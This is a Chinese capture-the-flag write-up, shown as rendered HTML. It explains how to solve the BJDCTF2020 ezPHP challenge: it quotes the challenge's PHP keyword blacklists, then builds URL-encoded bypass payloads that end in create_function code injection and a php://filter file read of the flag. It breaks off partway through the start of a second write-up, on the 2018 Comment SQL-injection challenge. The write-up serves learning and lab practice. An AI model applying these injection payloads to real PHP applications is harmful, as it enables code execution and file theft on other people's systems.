&lt;pre&gt;&lt;code&gt;if($_SERVER) &amp;#123; 
    if (
//几乎ban掉了payload里所有可能用到的词        preg_match(&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&amp;quot;|\&#39;|log/i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])
        )  
        die(&#39;You seem to want to do something bad?&#39;); 
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;_serverquery_string函数不对传入的东西进行url编码所以把payload进行url编码之后传入即可绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#_serverquery_string函数不对传入的东西进行url编码所以把payload进行url编码之后传入即可绕过&#34;&gt;#&lt;/a&gt; $_SERVER [‘QUERY_STRING’] 函数不对传入的东西进行 url 编码，所以把 payload 进行 url 编码之后传入即可绕过&lt;/h5&gt;
&lt;p&gt;(ps: 一般的 url 编码不能把英文字母等非特殊字符也编码，所以本题中如果只是把 payload 丢到编码器里没有用，但我也只找到这个师傅说了对应的解决办法&lt;/p&gt;
&lt;h6 id=&#34;英语字符的url编码就是在字符的十六进制前面加了个百分号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#英语字符的url编码就是在字符的十六进制前面加了个百分号&#34;&gt;#&lt;/a&gt; 英语字符的 url 编码就是在字符的十六进制前面加了个百分号&lt;/h6&gt;
&lt;h4 id=&#34;2preg_match绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2preg_match绕过&#34;&gt;#&lt;/a&gt; 2.preg_match 绕过&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;if (!preg_match(&#39;/http|https/i&#39;, $_GET[&#39;file&#39;]))
//不能包含http|https
&amp;#123;
    if (preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;])&amp;amp;&amp;amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;)
 //需要在debu=xxx中匹配到‘/^&amp;amp;/’，且debu不能为‘aqua_is_cute’
    &amp;#123; 
        $file = $_GET[&amp;quot;file&amp;quot;]; //用file=xxx传值
        echo &amp;quot;Neeeeee! Good Job!&amp;lt;br&amp;gt;&amp;quot;;
    &amp;#125; 
&amp;#125; else die(&#39;fxck you! What do you want to do ?!&#39;);
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;是正则匹配表示以xxx开头表示以xxx结尾现在需要绕过preg_match所以在deduaqua_is_cute末尾加上换行也就是加上0a&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#是正则匹配表示以xxx开头表示以xxx结尾现在需要绕过preg_match所以在deduaqua_is_cute末尾加上换行也就是加上0a&#34;&gt;#&lt;/a&gt; &#39;/^&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mtext&gt;是正则匹配&lt;/mtext&gt;&lt;msup&gt;&lt;mtext&gt;，&lt;/mtext&gt;&lt;mtext&gt;表&lt;/mtext&gt;&lt;/msup&gt;&lt;mtext&gt;示以&lt;/mtext&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mtext&gt;开头，&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;/&amp;#x27;是正则匹配，^表示以xxx开头，&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.0913309999999998em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;是&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;正&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;则&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;匹&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;配&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8413309999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord cjk_fallback mtight&#34;&gt;表&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;示&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;以&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;开&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;头&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;表示以 xxx 结尾，现在需要绕过 preg_match，所以在 dedu=aqua_is_cute 末尾加上换行（也就是加上 %0a）&lt;/h5&gt;
&lt;h4 id=&#34;3_request绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3_request绕过&#34;&gt;#&lt;/a&gt; 3.$_REQUEST 绕过&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;if($_REQUEST) &amp;#123; 
    foreach($_REQUEST as $value) &amp;#123; 
        if(preg_match(&#39;/[a-zA-Z]/i&#39;, $value)) 
        //要求不能有字母
            die(&#39;fxck you! I hate English!&#39;); 
    &amp;#125; 
&amp;#125; 
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;$_POST优先级高于$_GET,所以用POST传入的值会把$_GET中的值覆盖掉
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;4file_get_contents绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4file_get_contents绕过&#34;&gt;#&lt;/a&gt; 4.file_get_contents 绕过&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;if (file_get_contents($file) !== &#39;debu_debu_aqua&#39;)
    die(&amp;quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&amp;lt;br&amp;gt;&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;此处用data伪协议即可绕过datatextplain~&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#此处用data伪协议即可绕过datatextplain~&#34;&gt;#&lt;/a&gt; 此处用 data 伪协议即可绕过（data://text/plain,~）&lt;/h5&gt;
&lt;h4 id=&#34;5sha1函数-比较类型数组绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5sha1函数-比较类型数组绕过&#34;&gt;#&lt;/a&gt; 5.sha1 函数、比较类型数组绕过&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;if ( sha1($shana) === sha1($passwd) &amp;amp;&amp;amp; $shana != $passwd )
//既要shana和passwd传入的值不相同，又要这两个传入的值经过sha1散列之后强相等
&amp;#123;
    extract($_GET[&amp;quot;flag&amp;quot;]);
    echo &amp;quot;Very good! you know my password. But what is flag?&amp;lt;br&amp;gt;&amp;quot;;
&amp;#125; else&amp;#123;
    die(&amp;quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&amp;quot;);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;sha1函数对数组不敏感所以用shana0passwd1绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sha1函数对数组不敏感所以用shana0passwd1绕过&#34;&gt;#&lt;/a&gt; sha1 函数对数组不敏感，所以用 shana []=0&amp;amp;passwd []=1 绕过&lt;/h5&gt;
&lt;h5 id=&#34;至此为止满足以上五个条件的payload是&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#至此为止满足以上五个条件的payload是&#34;&gt;#&lt;/a&gt; // 至此为止，满足以上五个条件的 payload 是：&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;file=data://text/plain,debu_debu_aque&amp;amp;debu=aque_is_cute%0a&amp;amp;shana[]=0&amp;amp;passwd[]=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;url 编码后就是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;amp;%73%68%61%6e%61[]=1&amp;amp;%70%61%73%73%77%64[]=2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;同时 POST 传入：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;file=1&amp;amp;debu=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BBJDCTF2020%5DezPHP/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;这样就是最后一个绕过：&lt;/p&gt;
&lt;h4 id=&#34;6create_function运用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6create_function运用&#34;&gt;#&lt;/a&gt; 6.create_function 运用：&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;if(preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $code) || 
preg_match(&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&amp;#123;|\%|x|\&amp;amp;|\$|\*|\||\&amp;lt;|\&amp;quot;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;, $arg) ) 
//ban了这么这么多，肯定不能用一般方法传入payload了
&amp;#123; 
    die(&amp;quot;&amp;lt;br /&amp;gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag =w=&amp;quot;); 
&amp;#125; else &amp;#123; 
    include &amp;quot;flag.php&amp;quot;;//包含了flag.php这个文件
    $code(&#39;&#39;, $arg);
&amp;#125; ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;code 和 arg 是可更改变量，所以在这两个东西上下功夫&lt;/p&gt;
&lt;h5 id=&#34;61由第5步中extract函数可见需要通过flagargxxxflagcodexxx传参&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#61由第5步中extract函数可见需要通过flagargxxxflagcodexxx传参&#34;&gt;#&lt;/a&gt; 6.1 由第 5 步中（extract 函数可见，需要通过 flag [arg]=xxx，flag [code]=xxx 传参&lt;/h5&gt;
&lt;h5 id=&#34;62利用create_function对于&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#62利用create_function对于&#34;&gt;#&lt;/a&gt; 6.2 利用 create_function, 对于&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;$aaa = create_function(&#39;$a, $b&#39;, &#39;return $a+$b;&#39;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;相当于&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;function aaa($a, $b)&amp;#123;
    return $a+$b;
&amp;#125;  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对于&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$code=return $a+$b;&amp;#125;fction();//
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;相当于&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;function aaa($a, $b)&amp;#123;
    return $a+$b;
&amp;#125;  
fction();//&amp;#125;（fction为某个任意函数，&amp;quot;//&amp;quot;可以注释掉后面的内容）
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;应用到本题，可以得到&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;flag[code]=create_function&amp;amp;flag[arg]=&amp;#125;fction();//
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;63由于包含了flagphp这个文件为了查看所以用到两个函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#63由于包含了flagphp这个文件为了查看所以用到两个函数&#34;&gt;#&lt;/a&gt; 6.3 由于包含了 flag.php 这个文件，为了查看所以用到两个函数&lt;/h5&gt;
&lt;p&gt;var_dump：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZnVuY3Rpb24udmFyLWR1bXAucGhw&#34;&gt;https://www.php.net/manual/zh/function.var-dump.php&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;get_defined_vars()：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY29kZXJjdG8uY29tL2NvdXJzZXMvZC84NjMuaHRtbA==&#34;&gt;https://www.codercto.com/courses/d/863.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;可以利用 &lt;code&gt;get_defined_vars()&lt;/code&gt;  将所有变量和值都进行输出&lt;/p&gt;
&lt;p&gt;所以构造 payload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;flag[code]=create_function&amp;amp;flag[arg]=&amp;#125;var_dump(get_defined_vars());//
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;64字母和数字都被ban了所以跟前面一样用url编码一下&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#64字母和数字都被ban了所以跟前面一样用url编码一下&#34;&gt;#&lt;/a&gt; 6.4 字母和数字都被 ban 了，所以跟前面一样，用 url 编码一下&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;amp;%73%68%61%6e%61[]=1&amp;amp;%70%61%73%73%77%64[]=2&amp;amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;amp;%66%6c%61%67%5b%61%72%67%5d=&amp;#125;%76%61%72%5f%64%75%6d%70(%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73());//

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;POST 传参：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;file=1&amp;amp;debu=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BBJDCTF2020%5DezPHP/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;65提示了flag在rea1fl4gphp里所以考虑用require函数phpfilter读取文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#65提示了flag在rea1fl4gphp里所以考虑用require函数phpfilter读取文件&#34;&gt;#&lt;/a&gt; 6.5 提示了 flag 在 rea1fl4g.php 里，所以考虑用 require 函数，php//filter 读取文件&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;url 编码之后&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;require(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;利用异或或者～进行取反操作&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f))

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;替换上一步中的 var_dump (get_defined_vars ())&lt;/p&gt;
&lt;p&gt;最终最终的 payload&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/1nD3x.php?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;amp;%73%68%61%6e%61[]=1&amp;amp;%70%61%73%73%77%64[]=2&amp;amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;amp;%66%6c%61%67%5b%61%72%67%5d=&amp;#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f))
;//
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;POST 传参：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;file=1&amp;amp;debu=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BBJDCTF2020%5DezPHP/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BBJDCTF2020%5DezPHP/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;获得 flag！&lt;/p&gt;

 &lt;h2 id=&#34;网鼎杯-2018comment&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网鼎杯-2018comment&#34;&gt;#&lt;/a&gt; [网鼎杯 2018] Comment&lt;/h2&gt;
&lt;p&gt;### 知识点&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;git 泄露&lt;/li&gt;
&lt;li&gt;SQL 二次注入&lt;/li&gt;
&lt;li&gt;SQL 文件读取&lt;/li&gt;
&lt;li&gt;特殊文件识别和利用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;用 githack 将文件下载下来：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;mysql.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;session_start&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;login&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;yes&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Location: ./login.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;do&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;switch&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;do&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;write&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$category&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;addslashes&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;category&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$title&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;addslashes&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;title&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$content&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;addslashes&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;content&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;insert into 